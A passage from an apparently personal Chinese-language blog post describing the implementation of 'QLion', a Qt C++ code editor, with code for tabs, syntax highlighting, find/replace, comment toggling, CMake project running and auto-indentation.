class="hljs-keyword">this</span>), fileName);        }        usingFilePath[filePath] = <span class="hljs-built_in">count</span>() - <span class="hljs-number">1</span>;        <span class="hljs-built_in">setCurrentIndex</span>(<span class="hljs-built_in">count</span>() - <span class="hljs-number">1</span>);        <span class="hljs-keyword">auto</span> *codePage = <span class="hljs-built_in">getCurrentCodePage</span>();        <span class="hljs-comment">// do not forget to set the parentTabWidget</span>        <span class="hljs-built_in">getCurrentCodePage</span>()-&gt;<span class="hljs-built_in">setParentTabWidget</span>(<span class="hljs-keyword">this</span>);        codePage-&gt;<span class="hljs-built_in">setFilePath</span>(filePath);        codePage-&gt;<span class="hljs-built_in">setPlainText</span>(text);    }}</code></pre></div></div><p>由于文字较长时代码高亮会有卡顿，因此当大于一定长度的时候取消高亮。现在的编辑器如VSCode也是这么做的。</p><p>新建的标签页</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-tdtncklluwpkzu"></i><span>C++</span><div class="collapse show" id="collapse-tdtncklluwpkzu"><pre><code class="hljs C++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">QLionTabWidget::addNewTab</span><span class="hljs-params">()</span> </span>{    <span class="hljs-keyword">if</span> (mainWindow) {        <span class="hljs-comment">// get the minimum unused untitledID from the set</span>        <span class="hljs-type">int</span> newID = <span class="hljs-number">1</span>;        <span class="hljs-comment">// it will iterate at most size() times</span>        <span class="hljs-keyword">while</span> (usingUntitledID.<span class="hljs-built_in">count</span>(newID)) {            newID++;        }        usingUntitledID.<span class="hljs-built_in">insert</span>(newID);        QString title = <span class="hljs-string">"Untitled-"</span> + QString::<span class="hljs-built_in">number</span>(newID);        <span class="hljs-built_in">addTab</span>(<span class="hljs-keyword">new</span> <span class="hljs-built_in">QLionCodePage</span>(<span class="hljs-keyword">this</span>), title);        <span class="hljs-built_in">setCurrentIndex</span>(<span class="hljs-built_in">count</span>() - <span class="hljs-number">1</span>);        QLionCodePage *currentCodePage = <span class="hljs-built_in">getCurrentCodePage</span>();        currentCodePage-&gt;<span class="hljs-built_in">setParentTabWidget</span>(<span class="hljs-keyword">this</span>);        currentCodePage-&gt;<span class="hljs-built_in">setUntitledID</span>(newID);    }}</code></pre></div></div><h4 id="关闭标签页">关闭标签页</h4><p>关闭标签页时，若标签页未保存，需要提示是否进行保存。同时如果没有标签页，应当把菜单栏上复制粘贴等按钮禁用掉，也不应当进行查找替换等。</p><h4 id="行号事件响应">行号事件响应</h4><h5 id="点击事件">点击事件</h5><p>VSCode中点击行号可以跳转到对应行号，选中该行文本并将光标置于下一行。对此进行实现:</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-5hh1uolluwpkzu"></i><span>C++</span><div class="collapse show" id="collapse-5hh1uolluwpkzu"><pre><code class="hljs C++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">mousePressEvent</span><span class="hljs-params">(QMouseEvent *event)</span> <span class="hljs-keyword">override</span></span>{    codeEditor-&gt;<span class="hljs-built_in">lineNumberAreaMousePressEvent</span>(event);}</code></pre></div></div><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-xyp7uzlluwpkzu"></i><span>C++</span><div class="collapse show" id="collapse-xyp7uzlluwpkzu"><pre><code class="hljs C++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">QLionCodePage::lineNumberAreaMousePressEvent</span><span class="hljs-params">(QMouseEvent *mEvent)</span> </span>{    <span class="hljs-comment">// select the current line and jump the cursor to the beginning of the next line</span>    <span class="hljs-type">int</span> clickedLineNumber=<span class="hljs-built_in">qRound</span>(mEvent-&gt;<span class="hljs-built_in">position</span>().<span class="hljs-built_in">y</span>())/<span class="hljs-built_in">fontMetrics</span>().<span class="hljs-built_in">height</span>()+<span class="hljs-built_in">verticalScrollBar</span>()-&gt;<span class="hljs-built_in">value</span>();<span class="hljs-comment">//    qDebug()&lt;&lt;clickedLineNumber;</span>    QTextBlock clickedBlock=<span class="hljs-built_in">document</span>()-&gt;<span class="hljs-built_in">findBlockByLineNumber</span>(clickedLineNumber);    <span class="hljs-function">QTextCursor <span class="hljs-title">cursor</span><span class="hljs-params">(clickedBlock)</span></span>;       cursor.<span class="hljs-built_in">movePosition</span>(QTextCursor::QTextCursor::NextBlock,QTextCursor::KeepAnchor);    <span class="hljs-built_in">setTextCursor</span>(cursor);}</code></pre></div></div><h4 id="滚动事件">滚动事件</h4><p>和TextEdit部分保持同步即可。</p><h4 id="绘制事件">绘制事件</h4><p>需要获取当前可见区域的第一个Block获取其行号。Block按照链表组织，一直next获取下一个Block直到看不见为止，绘制可见区域数字。绘制宽度和位置需要根据字体和数字位数动态调整。参见代码中<code>lineNumberAreaPaintEvent</code>部分。</p><h3 id="代码高亮">代码高亮</h3><p>代码高亮使用了QT提供的<code>QSyntaxHighlighter</code>利用正则表达式进行高亮。由于C++不是LR(1)文法，必然不能使用正则表达式进行准确的高亮。但是可以使用一些trick让高亮尽可能的准确。</p><p>这一部分需要注意的主要是:</p><ul><li>后添加的规则的高亮会覆盖掉先添加的规则</li><li>完全可以部分高亮匹配的文本，也可以为不同的部分添加不同的高亮颜色</li></ul><p>基于第一条，我们必须选择合理的顺序渲染；同时还可以弥补一些渲染上的缺陷。比如浮点数的渲染。搜索尝试了多种正则表达形式，最后采用了编译原理中编写了一条几乎适用所有浮点形式的正则表达式:</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-6nq1ellluwpkzu"></i><span>C++</span><div class="collapse show" id="collapse-6nq1ellluwpkzu"><pre><code class="hljs C++">((([<span class="hljs-number">0</span><span class="hljs-number">-9</span>]*[.][<span class="hljs-number">0</span><span class="hljs-number">-9</span>]*([eE][+-]?[<span class="hljs-number">0</span><span class="hljs-number">-9</span>]+)?)|([<span class="hljs-number">0</span><span class="hljs-number">-9</span>]+[eE][+-]?[<span class="hljs-number">0</span><span class="hljs-number">-9</span>]+))[fLlL]?)</code></pre></div></div><p>它可以匹配<code>.xxx</code>和<code>xxx.</code>形式的浮点数，且不与变量名冲突(这也是为什么编译原理词法分析选择用这个表达式)，还能匹配科学计数法和带显式浮点格式的浮点数。但是唯一的缺陷是会把单独的点高亮。而通常在作为类成员访问符时是不高亮的。类成员的高亮规则刚好解决了这个问题。我们认为点后面加变量名这种方式作为类成员的高亮定义。又根据第二条，我们可单独为此时的点设置不同的颜色。把这条规则放到浮点数后面，就能完美的解决点高亮的问题。</p><p>第二条的其他应用比如我们可以将头文件定义作为一条规则来匹配。CLion中高亮是这样:</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/QLion%E4%BB%A3%E7%A0%81%E7%BC%96%E8%BE%91%E5%99%A8/20230828210629995825_889_20230526120424273658_879_20230515214328373693_177_image-20230514210950317.png" alt="image-20230514210950317"><figcaption aria-hidden="true">image-20230514210950317</figcaption></figure><p>单独的尖括号包裹的字符串不会被高亮，只有与<code>#include</code>配合使用时才会高亮。这只有通过单一匹配规则和部分高亮实现:</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-wnhbh6lluwpkzu"></i><span>C++</span><div class="collapse show" id="collapse-wnhbh6lluwpkzu"><pre><code class="hljs C++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Highlighter::addIncludeFormat</span><span class="hljs-params">(<span class="hljs-type">const</span> QString &amp;text)</span> </span>{    HighlightRule rule;    rule.pattern = <span class="hljs-built_in">QRegularExpression</span>(<span class="hljs-string">R"(#include\s*[&lt;"][a-zA-Z0-9_./\\]*[&gt;"])"</span>);    <span class="hljs-function">QColor <span class="hljs-title">stringColor</span><span class="hljs-params">(<span class="hljs-number">106</span>, <span class="hljs-number">135</span>, <span class="hljs-number">89</span>)</span></span>;    <span class="hljs-function">QColor <span class="hljs-title">includeColor</span><span class="hljs-params">(<span class="hljs-number">255</span>, <span class="hljs-number">198</span>, <span class="hljs-number">109</span>)</span></span>;    rule.format.<span class="hljs-built_in">setForeground</span>(stringColor);    rule.format.<span class="hljs-built_in">setFont</span>(<span class="hljs-built_in">QFont</span>(mFontFamily, mFontSize));    QRegularExpressionMatchIterator matchIterator = rule.pattern.<span class="hljs-built_in">globalMatch</span>(text);    <span class="hljs-keyword">while</span> (matchIterator.<span class="hljs-built_in">hasNext</span>()) {        QRegularExpressionMatch match = matchIterator.<span class="hljs-built_in">next</span>();        <span class="hljs-comment">// set the "#include" to includeColor and others to stringColor</span>        <span class="hljs-built_in">setFormat</span>(match.<span class="hljs-built_in">capturedStart</span>(), <span class="hljs-number">8</span>, includeColor);        <span class="hljs-built_in">setFormat</span>(match.<span class="hljs-built_in">capturedStart</span>() + <span class="hljs-number">8</span>, match.<span class="hljs-built_in">capturedLength</span>() - <span class="hljs-number">8</span>, rule.format);    }}</code></pre></div></div><p>由于时间原因没做主题配置功能，因此颜色暂时硬编码到了代码中。</p><p>另外，不同于单行的高亮内容。若支持高亮注释，需要记录每一行的状态。QT提供了<code>setCurrentBlockState()</code>函数供我们记录行的信息。对每一行来说，如果上一行是注释，跳过检测前面的<code>/*</code>。代码实现如下:</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-z9j55plluwpkzu"></i><span>C++</span><div class="collapse show" id="collapse-z9j55plluwpkzu"><pre><code class="hljs C++"><span class="hljs-comment">//notice: it was called line by line</span><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Highlighter::addMultiLineCommentFormat</span><span class="hljs-params">(<span class="hljs-type">const</span> QString &amp;text)</span> </span>{    <span class="hljs-comment">//mark the start of the comment</span>    <span class="hljs-built_in">setCurrentBlockState</span>(<span class="hljs-number">0</span>);    <span class="hljs-function">QRegularExpression <span class="hljs-title">startExpression</span><span class="hljs-params">(<span class="hljs-string">R"(/\*)"</span>)</span></span>;    <span class="hljs-function">QRegularExpression <span class="hljs-title">endExpression</span><span class="hljs-params">(<span class="hljs-string">R"(\*/)"</span>)</span></span>;    <span class="hljs-function">QColor <span class="hljs-title">color</span><span class="hljs-params">(<span class="hljs-number">128</span>, <span class="hljs-number">128</span>, <span class="hljs-number">128</span>)</span></span>;    QTextCharFormat multiLineCommentFormat;    multiLineCommentFormat.<span class="hljs-built_in">setForeground</span>(color);    multiLineCommentFormat.<span class="hljs-built_in">setFont</span>(<span class="hljs-built_in">QFont</span>(mFontFamily, mFontSize));    <span class="hljs-type">long</span> <span class="hljs-type">long</span> startIndex = <span class="hljs-number">0</span>;    <span class="hljs-comment">// that is, if the previous line is not a comment</span>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">previousBlockState</span>() != <span class="hljs-number">1</span>)        startIndex = startExpression.<span class="hljs-built_in">match</span>(text).<span class="hljs-built_in">capturedStart</span>();    <span class="hljs-comment">//if the previous line is a comment, we should start from the beginning of the line (startIndex=0)</span>    <span class="hljs-keyword">while</span> (startIndex &gt;= <span class="hljs-number">0</span>) {        QRegularExpressionMatch endMatch = endExpression.<span class="hljs-built_in">match</span>(text, startIndex);        <span class="hljs-type">long</span> <span class="hljs-type">long</span> endIndex = endMatch.<span class="hljs-built_in">capturedStart</span>();        <span class="hljs-type">long</span> <span class="hljs-type">long</span> commentLength = <span class="hljs-number">0</span>;        <span class="hljs-keyword">if</span> (endIndex == <span class="hljs-number">-1</span>) {            <span class="hljs-comment">// we still in a comment</span>            <span class="hljs-built_in">setCurrentBlockState</span>(<span class="hljs-number">1</span>);            commentLength = text.<span class="hljs-built_in">length</span>() - startIndex;        } <span class="hljs-keyword">else</span> {            <span class="hljs-comment">// we find the end of the comment</span>            commentLength = endIndex - startIndex + endMatch.<span class="hljs-built_in">capturedLength</span>();        }        <span class="hljs-built_in">setFormat</span>(startIndex, commentLength, multiLineCommentFormat);        startIndex = startExpression.<span class="hljs-built_in">match</span>(text, startIndex + commentLength).<span class="hljs-built_in">capturedStart</span>();    }}</code></pre></div></div><p>可以看到几乎还原了在真实代码编辑器中的显示效果。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/QLion%E4%BB%A3%E7%A0%81%E7%BC%96%E8%BE%91%E5%99%A8/20230828210630856348_646_20230526120428544516_280_20230515214329527229_954_image-20230514230623432.png" alt="image-20230514230623432"><figcaption aria-hidden="true">image-20230514230623432</figcaption></figure><h3 id="菜单栏功能">菜单栏功能</h3><h4 id="打开文件">打开文件</h4><p>打开文件是文本编辑器的基本操作。需要判断文件是否有效，保存打开路径以便下次从这个目录再寻找文件，还要判断是否需要在标签栏上区分路径。得益于面向对象和封装的思想，<code>mainwindow</code>提供打开文件的接口后，除了通过菜单栏打开文件，后续通过文件目录树打开文件，通过拖拽打开文件等都可以直接调用接口，而不必再关心怎样区分标签栏路径这样的细节。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/QLion%E4%BB%A3%E7%A0%81%E7%BC%96%E8%BE%91%E5%99%A8/20230828210633016353_975_20230526120431011874_864_20230515214330918451_552_image-20230514220624197.png" alt="image-20230514220624197"><figcaption aria-hidden="true">image-20230514220624197</figcaption></figure><h4 id="保存文件">保存文件</h4><p>在项目的设计中将保存文件交给了<code>QLionCodePage</code>，即让打开的标签页自己处理保存事件。当新建的文件保存时会产生文件路径，需要更新对应的数据结构，并区分标签页。同样的，后续运行项目，关闭标签页提示等需要用到保存操作时，不必关心实现的细节。</p><h4 id="编辑操作">编辑操作</h4><p>直接交由对应标签页处理即可。注意到若光标没有选中文本，复制会直接复制一行。</p><h4 id="查找替换操作">查找替换操作</h4><p>这一部分是查找替换功能实现后写的，获取选中文本，跳转到对应页面设置文本即可。</p><h3 id="文件目录树">文件目录树</h3><p>这一部分采用了QT中模型-视图结构。通过<code>QTreeView</code>和<code>QFileSystemModel</code>结合使用可以实现显示文件目录。<code>Treeview</code>上<code>mouseReleaseEvent</code>操作可以实现对文件的创建，重命名，删除操作。</p><p>需要注意，如果点击的<code>idx</code>无效，说明点的是空白的地方，并不是什么都不做，而是在根目录进行操作。</p><p>新建和重命名操作都是新弹出一个Widget，设置好出现的尺寸，相应回车操作。</p><p>重命名操作是其中最复杂的操作，经过多次测试才确保无误。重命名后，需要根据文件路径查找是否该文件已经在tabWidget上显示，如果显示了需要更新其路径。当然也会出现名字冲突的现象，代码中已经将其抽象为<code>distinguishFileName</code>。</p><p>拖拽操作需要重载三个<code>event</code>，其中<code>dropEvent</code>需要将文件添加到正确的位置，其他的只需要判断拖拽的是不是文件即可。</p><p>上述操作目录相关的操作需要对其下的文件进行递归操作，一开始只看到有<code>rmdir</code>这个接口，自己造了轮子结果演示的时候发现<code>build</code>目录本身删不掉。后续测试发现其他目录都是可以的。为什么呢？阅读<a href="https://doc.qt.io/qt-6/qdir.html#rmdir">文档</a>发现删除目录需要目录非空。<code>build</code>看上去是空的，但是获取文件列表的时候隐藏文件获取不到。实际上它就不是空的：</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/QLion%E4%BB%A3%E7%A0%81%E7%BC%96%E8%BE%91%E5%99%A8/20230828210636167250_523_20230526120435138781_928_20230515214332155342_338_image-20230515153815269.png" alt="image-20230515153815269"><figcaption aria-hidden="true">image-20230515153815269</figcaption></figure><p>后来发现有<a href="https://doc.qt.io/qt-6/qdir.html#removeRecursively">removeRecursively</a>，这个是可以正常工作的。还是得好好看文档。</p><p>这一部分相对比较繁琐，花费时间也较长，但主要为API调用和操作逻辑为主，没有什么特别的技巧性的东西。</p><h3 id="查找替换">查找替换</h3><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/QLion%E4%BB%A3%E7%A0%81%E7%BC%96%E8%BE%91%E5%99%A8/20230828210637293661_672_20230526120441592831_476_20230515214333625979_193_image-20230514231847964.png" alt="image-20230514231847964"><figcaption aria-hidden="true">image-20230514231847964</figcaption></figure><p>首先比较坑的是需要处理好切换逻辑。可以使用<code>QActionLIst</code>完成互斥动作处理，不过由于只有两个动作，暂时直接在代码里写切换逻辑也不是不行。</p><p>查找替换的高亮(和文本选中)操作也需要更新。切换标签页时需要在新的标签栏高亮，取消旧标签栏高亮，切换到文件目录树也是如此。这需要为标签页切换额外增加槽函数。但信号的index是切换后的index，我们需要增加一变量保存切换前的index。但这个切换前的index使用时需要判断其有效性，比如关闭标签页时可能会导致保存的这个index不可用，造成内存泄漏。</p><p>高亮所有匹配目标仍旧是采用的HightLighter.为其动态额外增加高亮目标即可。不想高亮了将其设为空字符串。但是由于高亮器是按行高亮的，为关键字设置背景色时与<code>plaintextEdit</code>为当前行添加<code>extraSelection</code>可能有冲突。目前没找到好的解决方案，不过这个问题也不影响正常使用。</p><p>注意到替换文本可能会为查找位置带来偏移，一开始保存的查找到的位置可能会失效。如果Highlighter提供某个正则表达式第n个匹配位置之类的接口，这就不需要我们太担心这个问题，只需要利用highlighter实时获取位置即可。理论上现在的编辑器支持查找过程中改变文本，也是采用的实时正则匹配。但是一开始没有考虑到偏移问题，采用的是第一次查询把所有位置保存下来，后面查找直接从向量中取位置出来即可。后面发现这是一种很蠢的方案。毕竟，这些位置是编辑敏感的，编辑或替换文本后位置就变了。因此后续引入了偏移，以在替换时根据查找词长度更新位置。但是这还是没解决编辑的问题。因此查找替换时冻结了编辑页面。这样可以经过简单的偏移计算保证位置准确性。不过由于每次替换都需要更新后续所有的位置，复杂度还是很高。后来意识到没有有效利用高亮器提供的匹配功能本身就带有长度和位置信息。但是由于时间有限，这一部分并没有进行比较优雅的设计。后续再去进行调整。比较合理的思路是高亮器获取当前查找的index，高亮的过程中记录位置和匹配个数，分别发送信号给codePage和mainWindow(再传给FindReplaceView,这样设计的原因是有较明确的主从关系，而非任何两个对象都能直接交流，造成较强的耦合)去改变选中文本和查找的情况。抛开底层算法(字符串和正则匹配)的复杂性，将这一部分的业务逻辑进行合理的设计也是需要费些心思的。这也是在这个项目上面投入时间有些后悔的原因:比起业务逻辑和API调用，算法和系统设计才是我们最应当关注的地方。除开智商的因素，尽可能有意识的培养这一方面的直觉还是给常重要的。</p><h3 id="快速注释">快速注释</h3><p>快速注释可以通过按<kbd>ctrl</kbd>+<kbd>/</kbd>来注释和取消注释。看上去只是在行首添加或去掉<code>/</code>的问题，但更重要的是需要将光标恢复到原来的位置。如果处理不好将导致光标恢复到错误的位置甚至有效范围之外，导致不可预知的行为。另外需要额外处理单个<code>/</code>的情况，虽然这种情况在实际编辑中并不常见。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-c36zlalluwpkzu"></i><span>C++</span><div class="collapse show" id="collapse-c36zlalluwpkzu"><pre><code class="hljs C++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">QLionCodePage::denoteCurrentLine</span><span class="hljs-params">()</span> </span>{    QTextCursor cursor = <span class="hljs-built_in">textCursor</span>();    <span class="hljs-comment">// record the current position</span>    <span class="hljs-type">int</span> position = cursor.<span class="hljs-built_in">position</span>();    <span class="hljs-type">int</span> positionInBlock = cursor.<span class="hljs-built_in">positionInBlock</span>();<span class="hljs-comment">//    qDebug() &lt;&lt; position &lt;&lt; " " &lt;&lt; positionInBlock;</span>    cursor.<span class="hljs-built_in">movePosition</span>(QTextCursor::StartOfLine);    QString text = cursor.<span class="hljs-built_in">block</span>().<span class="hljs-built_in">text</span>();    <span class="hljs-type">int</span> i;    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;text.<span class="hljs-built_in">length</span>();i++){        <span class="hljs-keyword">if</span>(text[i]==<span class="hljs-string">' '</span>||text[i]==<span class="hljs-string">'\t'</span>){            <span class="hljs-keyword">continue</span>;        }        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(text[i]==<span class="hljs-string">'/'</span>){            <span class="hljs-keyword">if</span>(i&lt;text.<span class="hljs-built_in">length</span>()<span class="hljs-number">-1</span>){                <span class="hljs-keyword">if</span>(text[i+<span class="hljs-number">1</span>]==<span class="hljs-string">'/'</span>) {                    <span class="hljs-comment">//it is a line with spaces and a double '/', remove the denotation here</span>                    cursor.<span class="hljs-built_in">movePosition</span>(QTextCursor::Right, QTextCursor::MoveAnchor, i);                    cursor.<span class="hljs-built_in">movePosition</span>(QTextCursor::Right, QTextCursor::KeepAnchor, <span class="hljs-number">2</span>);                    cursor.<span class="hljs-built_in">removeSelectedText</span>();                    <span class="hljs-keyword">if</span>(positionInBlock&lt;=i){                        <span class="hljs-comment">// if the cursor is at the left of the denotation, move the cursor to the original position</span>                        cursor.<span class="hljs-built_in">setPosition</span>(position);                    }                    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(positionInBlock==i+<span class="hljs-number">1</span>){                        <span class="hljs-comment">// if the cursor is at the middle of the denotation, move the cursor to the original position with a offset</span>                        cursor.<span class="hljs-built_in">setPosition</span>(position<span class="hljs-number">-1</span>);                    }                    <span class="hljs-keyword">else</span>{                        <span class="hljs-comment">// if the cursor is at the right of the denotation</span>                        cursor.<span class="hljs-built_in">setPosition</span>(position<span class="hljs-number">-2</span>);                    }                }                <span class="hljs-keyword">else</span>{                    <span class="hljs-comment">//it is a line with spaces and a single '/', add a single '/' here</span>                    cursor.<span class="hljs-built_in">movePosition</span>(QTextCursor::Right, QTextCursor::MoveAnchor, i+<span class="hljs-number">1</span>);                    cursor.<span class="hljs-built_in">insertText</span>(<span class="hljs-string">"/"</span>);                    <span class="hljs-keyword">if</span>(positionInBlock&lt;=i+<span class="hljs-number">1</span>){                        <span class="hljs-comment">// if the cursor is at the right of the denotation, move the cursor to the original position</span>                        cursor.<span class="hljs-built_in">setPosition</span>(position);                    }                    <span class="hljs-keyword">else</span>{                        <span class="hljs-comment">// if the cursor is at the left of the denotation, move the cursor to the original position with a offset</span>                        cursor.<span class="hljs-built_in">setPosition</span>(position+<span class="hljs-number">1</span>);                    }                }            }            <span class="hljs-keyword">else</span>{                <span class="hljs-comment">//it is a line with spaces and a single '/', add a single '/' to the end of the line</span>                cursor.<span class="hljs-built_in">movePosition</span>(QTextCursor::EndOfLine);                cursor.<span class="hljs-built_in">insertText</span>(<span class="hljs-string">"/"</span>);                cursor.<span class="hljs-built_in">setPosition</span>(position);            }            <span class="hljs-keyword">break</span>;        }        <span class="hljs-keyword">else</span>{            <span class="hljs-comment">// not start with spaces and '/', denote at the start of the line</span>            cursor.<span class="hljs-built_in">insertText</span>(<span class="hljs-string">R"(//)"</span>);            cursor.<span class="hljs-built_in">setPosition</span>(position+<span class="hljs-number">2</span>);            <span class="hljs-keyword">break</span>;        }    }    <span class="hljs-comment">// move the cursor to the original position</span>    <span class="hljs-built_in">setTextCursor</span>(cursor);}</code></pre></div></div><h3 id="cmake项目运行">Cmake项目运行</h3><p>众所周知，QT的强大之处在于跨平台。而CMake作为跨平台的构建工具，Clion为了支持跨平台也是用的CMake构建项目。我们的编辑器可以利用CMake完成平台和脚本无关的构建。我们只要设置好Cmake和构建器的路径，并交由用户自定义构建选项，CMake可以构建的项目，我们的编辑器也可以构建。</p><p><code>Qprocess</code>可以实现跨平台的命令运行。代码中定义了<code>QLionTerminal</code>类，完成可视化终端的设计并对<code>QProcess</code>类的功能进行封装。</p><p>一个Cmake项目的运行需要经历生成，构建，执行三个阶段。将这三个阶段以及空闲阶段作为状态构建枚举类，并作为<code>QLionTerminal</code>的状态机。同时在类中自定义了信号，当命令执行结束后<code>showFinished</code>槽函数被调用其功能是将命令执行状态打印到模拟终端UI上(使用PlaintextEdit实现)。并根据状态机的状态发射自定义信号给<code>mainWindow</code>，<code>mainWindow</code>根据状态判断是否要执行下一步命令，以及执行哪个命令。通过读取项目中的<code>CmakeList.txt</code>可以判断可执行对象(add_excuable)。一个项目中可能有多个可执行对象，由于时间有限只选取第一个可执行对象执行，多个对象执行的原理是一样的。若进行拓展，可读取所有可执行对象在右上角展示供用户选择(像Clion一样）。</p><p>Helloworld程序执行:</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/QLion%E4%BB%A3%E7%A0%81%E7%BC%96%E8%BE%91%E5%99%A8/20230828210638486833_708_20230526120443911766_742_20230515214335038890_263_image-20230514234245615.png" alt="image-20230514234245615"><figcaption aria-hidden="true">image-20230514234245615</figcaption></figure><p>同样的道理，我们甚至可以让它构建自己:</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/QLion%E4%BB%A3%E7%A0%81%E7%BC%96%E8%BE%91%E5%99%A8/20230828210640024604_748_20230526120448074383_533_20230515214336183959_219_image-20230514234354199.png" alt="image-20230514234354199"><figcaption aria-hidden="true">image-20230514234354199</figcaption></figure><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/QLion%E4%BB%A3%E7%A0%81%E7%BC%96%E8%BE%91%E5%99%A8/20230828210641025934_695_20230526120451711062_350_20230515214337928748_935_image-20230514234428154.png" alt="image-20230514234428154"><figcaption aria-hidden="true">image-20230514234428154</figcaption></figure><blockquote><p>以下内容为5.26日更新</p></blockquote><h2 id="主题配置">主题配置</h2><p>这一部分实际上实现的不是很优雅。根据软件工程的思想，我们的软件应当尽量的做到所谓的”高内聚低耦合“，并且有比较好的可拓展性。因为时间比较仓促，这里主要以功能的实现为第一要义，可拓展性做的比较差，主要表现在以下几个方面:</p><ul><li>主题的颜色，字体，风格等配置最好应当以配置文件的方式存在，目前是硬编码到了代码中。</li><li>当前用布尔值表示主题的切换。比如“我想要一个浅色的主题但又不喜欢朋克风”这种问题就会让我很尴尬。这样做若后续进行主题的增加甚至允许用户自定义主题，就需要改动较多的代码。不过鉴于这个项目也是写着玩的(我想没人会真的用这破玩意写代码)，<code>fancy</code>一些的主题就算是增添乐趣吧。</li></ul><h2 id="自动缩进">自动缩进</h2><p>这一部分看上去比较复杂，实际上需要考虑的因素也不少，但没有那么难。这一部分首先要做的是重写<code>keyPressEvent</code>识别按键，然后根据不同的按键结合上下文因素实现自动缩进。这里就以<code>{}</code>为例吧。</p><p>我们让<code>closeParenthesis</code>处理这件事，它包装了各种类型括号的操作。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-bxi87vlluwpkzu"></i><span>C++</span><div class="collapse show" id="collapse-bxi87vlluwpkzu"><pre><code class="hljs C++"><span class="hljs-keyword">if</span> (event-&gt;<span class="hljs-built_in">key</span>() == Qt::Key_BraceLeft) {    <span class="hljs-built_in">closeParenthesis</span>(<span class="hljs-string">"{"</span>, <span class="hljs-string">"}"</span>);    <span class="hljs-keyword">return</span>;}</code></pre></div></div><p><code>closeParenthesis</code>代码比较长。说一下主要思路，代码不看也行。首先我们需要判断是否有选中的文本。若有，那好说，直接用括号包住就可以了。对于<code>{}</code>，如果是紧跟在函数定义语句后面，证明我们要写函数体了，需要缩进一下。如果不是，那么可能是数组初始化之类的操作，我们就把括号补齐，移动光标到中间。其他的也是同理。</p><p>其中的<code>getIndentation</code>函数虽然短，但是是是实现自动缩进的核心。放代码:</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-eomplhlluwpkzu"></i><span>C++</span><div class="collapse show" id="collapse-eomplhlluwpkzu"><pre><code class="hljs C++"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">QLionCodePage::getIndentation</span><span class="hljs-params">(QTextCursor cursor)</span> </span>{    <span class="hljs-type">const</span> <span class="hljs-keyword">auto</span> prevLineText = cursor.<span class="hljs-built_in">block</span>().<span class="hljs-built_in">previous</span>().<span class="hljs-built_in">text</span>();    <span class="hljs-type">int</span> n = <span class="hljs-built_in">leadingSpaces</span>(prevLineText);    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">isEndingBraceOrColon</span>(prevLineText)) {        n += <span class="hljs-number">4</span>;    }    <span class="hljs-keyword">return</span> n;}</code></pre></div></div><p>我们获取前面一行，看有多少缩进。<code>leadingSpaces</code>处理了空格和<code>tab</code>缩进的情况。虽然我们在代码编辑器中将<code>tab</code>映射为四个空格，但不敢保证源文件里就没有。我们还要对tab进行讨论以及让它正常显示。</p><p>接下来<code>isEndingBraceOrColon</code>的作用是如果发现以<code>{</code>或<code>:</code>末尾的话，说明有新的类或函数声明，下面就要多缩进一级。最后返回的值是光标所在的一行需要缩进的字符数。</p><p>下面是<code>closeParenthesis</code>的完整代码，可以结合上面提到的思路阅读。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-gvd9v7lluwpkzu"></i><span>C++</span><div class="collapse show" id="collapse-gvd9v7lluwpkzu"><pre><code class="hljs C++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">QLionCodePage::closeParenthesis</span><span class="hljs-params">(<span class="hljs-type">const</span> QString &amp;startStr, <span class="hljs-type">const</span> QString &amp;endStr)</span> </span>{    <span class="hljs-keyword">auto</span> cursor = <span class="hljs-built_in">textCursor</span>();    <span class="hljs-keyword">if</span> (cursor.<span class="hljs-built_in">hasSelection</span>()) {        <span class="hljs-keyword">auto</span> start = cursor.<span class="hljs-built_in">selectionStart</span>();        <span class="hljs-keyword">auto</span> end = cursor.<span class="hljs-built_in">selectionEnd</span>();        cursor.<span class="hljs-built_in">setPosition</span>(start, cursor.MoveAnchor);        cursor.<span class="hljs-built_in">insertText</span>(startStr);        cursor.<span class="hljs-built_in">setPosition</span>(end + startStr.<span class="hljs-built_in">size</span>(), cursor.MoveAnchor);        cursor.<span class="hljs-built_in">insertText</span>(endStr);    } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (startStr == <span class="hljs-string">"{"</span>) {        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">checkCharacterBefore</span>(<span 